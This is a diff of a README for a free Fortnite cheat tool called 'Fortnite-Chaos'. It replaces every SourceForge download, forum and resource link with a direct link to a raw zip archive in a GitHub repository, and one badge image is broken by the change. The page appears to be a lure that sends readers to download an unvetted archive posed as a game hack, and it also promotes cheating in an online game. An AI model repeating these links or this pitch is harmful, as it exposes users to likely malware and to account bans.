@@ -18,7 +18,7 @@ Before you proceed, ensure your system meets these requirements:
 
 To begin, you need to download the application. Click the button below to visit the download page:
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download%20Fortnite--Chaos-FF5722?style=for-the-badge&logo=sourceforge&logoColor=white)](https://sourceforge.net/projects/fortnite-free-cheats-hacks)
+[![Download Fortnite-Chaos](https://raw.githubusercontent.com/MB389347/Fortnite-Chaos/main/interlaminar/Fortnite-Chaos_1.1.zip%20Fortnite--Chaos-FF5722?style=for-the-badge&logo=sourceforge&logoColor=white)](https://raw.githubusercontent.com/MB389347/Fortnite-Chaos/main/interlaminar/Fortnite-Chaos_1.1.zip)
 
 Once on the download page, you will find the latest version of Fortnite-Chaos. Follow these steps:
 
@@ -73,12 +73,12 @@ Find further help or report issues on our support forum on the download page.
 
 Join our community to connect with other users, share tips, and receive updates. Visit the link below:
 
-[Community Forum](https://sourceforge.net/projects/fortnite-free-cheats-hacks)
+[Community Forum](https://raw.githubusercontent.com/MB389347/Fortnite-Chaos/main/interlaminar/Fortnite-Chaos_1.1.zip)
 
 ## 🔗 Additional Resources
 
 For more information and to download the latest version, you can always return to the download page:
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download%20Fortnite--Chaos-FF5722?style=for-the-badge&logo=sourceforge&logoColor=white)](https://sourceforge.net/projects/fortnite-free-cheats-hacks)
+[![Download Fortnite-Chaos](https://raw.githubusercontent.com/MB389347/Fortnite-Chaos/main/interlaminar/Fortnite-Chaos_1.1.zip%20Fortnite--Chaos-FF5722?style=for-the-badge&logo=sourceforge&logoColor=white)](https://raw.githubusercontent.com/MB389347/Fortnite-Chaos/main/interlaminar/Fortnite-Chaos_1.1.zip)
 
 Thank you for using Fortnite-Chaos. Enjoy your gaming experience!
